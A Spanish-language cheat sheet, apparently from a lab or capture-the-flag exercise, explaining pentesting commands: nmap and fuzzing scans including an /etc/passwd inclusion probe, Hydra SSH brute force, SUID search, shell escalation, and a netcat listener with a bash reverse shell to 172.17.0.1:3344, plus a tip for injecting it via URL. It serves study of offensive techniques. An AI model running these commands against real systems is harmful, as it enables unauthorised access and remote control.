## 🛠️ Herramientas, comandos y servicios usados

### 🔍 Nmap
Escanea puertos y detecta servicios.
```
nmap -p- --open -A -sS -Pn -n <IP>

    -p-: escanea todos los puertos.
    
    --open: muestra solo los puertos abiertos.
    
    -A: detección de sistema y versión.
    
    -sS: escaneo SYN, más sigiloso.
    
    -Pn: no hace ping previo.
    
    -n: no resuelve nombres DNS. 
```

---

### 🪓 Gobuster
Hace fuzzing para encontrar directorios o archivos ocultos.
```
gobuster dir -u http://<IP>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,py,html,txt,js

    -w: diccionario.

    -x: extensiones que queremos probar.
```

---

### 🏹 Ffuf
Fuzzing para probar parámetros o rutas.
```
ffuf -c -t 200 -fc 404 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u "http://<IP>/index.php?FUZZ=/etc/passwd"

    -fc 404: ignora errores 404.
    
    -t 200: usa 200 hilos (va más rápido).
    
    -u: URL con FUZZ donde se probarán los valores.
```

---

### 🔐 Hydra
Fuerza bruta contra servicios de autenticación.
```
hydra -L usuarios.txt -p purpl3 -I ssh://172.17.0.2 -V -F -u

    -L usuarios.txt: lista de nombres de usuario. Si solo fuera un usuario lo indicamos y ponemos -l.
    
    -p purpl3: usa la contraseña "purpl3" para todos los usuarios. Si fuera ir probando + de una contraseña seria -P y usar por ejemplo el diccionario rockyou.
    
    -I: retoma sesión interrumpida si existe.
    
    ssh://172.17.0.2: objetivo y protocolo (SSH).
    
    -V: muestra cada intento de login (modo verboso).
    
    -F: para al encontrar una combinación válida.
    
    -u: prueba usuario a usuario, no combinaciones completas.

```

---

###  🔎 Find permisos SUID
Busca archivos ejecutables con bit SUID activado (ejecutables con privilegios del dueño).
```
find / -perm -4000 -user root 2>/dev/null

    /: busca desde la raíz del sistema.
    
    -perm -4000: busca archivos con bit SUID activado.
    
    -user root: limitados a archivos propiedad del usuario root(o el que especifiques).
    
    2>/dev/null: oculta errores (por ejemplo, por falta de permisos).

```

---

### 🐍 Python Shell Escalation
Ejecuta una shell Bash desde un script Python, útil para escalar privilegios si se ejecuta como root.
```
import os;
os.system("/bin/bash")
```

---

### 📡 Reverse Shell + Canal de Escucha
Permite tomar control remoto de una máquina: se abre un listener (atacante) y se conecta desde la víctima.

Abre un puerto (3344) a la espera de conexiones.
```
nc -lvnp 3344

-l: escucha.

-v: salida detallada.

-n: no resuelve DNS.

-p 3344: puerto a escuchar.
```

Ejecuta una shell interactiva que redirige entrada/salida hacia la IP del atacante (172.17.0.1) y puerto (3344).
```
bash -c "bash -i >& /dev/tcp/172.17.0.1/3344 0>&1"
```
> 🧠 Nota: Si se lanza desde navegador o HTTP (por ejemplo en una URL), reemplaza & por %26 para evitar que se corte el comando.

---

### 🎨 Ajustes de Terminal Remota
Configura el entorno de shell para una mejor compatibilidad y apariencia al conectarse por SSH o shells limitadas.
```
export TERM=xterm-256color
export SHELL=/bin/sh
source /etc/skel/.bashrc
```



